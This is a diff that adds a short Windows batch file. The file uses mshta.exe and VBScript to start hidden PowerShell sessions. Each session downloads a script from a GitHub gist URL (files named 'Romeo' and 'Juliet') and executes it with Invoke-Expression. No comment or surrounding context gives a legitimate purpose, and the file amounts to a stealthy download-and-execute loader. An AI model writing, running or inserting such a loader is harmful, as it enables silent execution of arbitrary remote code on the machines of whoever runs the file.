@@ -1,0 +1,6 @@
+@echo off
+
+mshta.exe vbscript:(CreateObject("WScript.Shell").Run("powershell -c $call = Invoke-WebRequest -Uri https://gist.githubusercontent.com/siliconmutex/5621b741baece822bb2532dbce7c65e0/raw/11e24b9855939d6ff6b36f0cb9e6de567fe9082a/Romeo ;iex($call);",0))(Window.Close).WaitForExit()
+mshta.exe vbscript:(CreateObject("WScript.Shell").Run("powershell -c $call = Invoke-WebRequest -Uri https://gist.githubusercontent.com/siliconmutex/d916e3c7acc651b036a97d79b48253cf/raw/53240fe943da569a945ec592493835d98d3e4b4c/Juliet ;iex($call);",0))(Window.Close).WaitForExit()
+
+exit
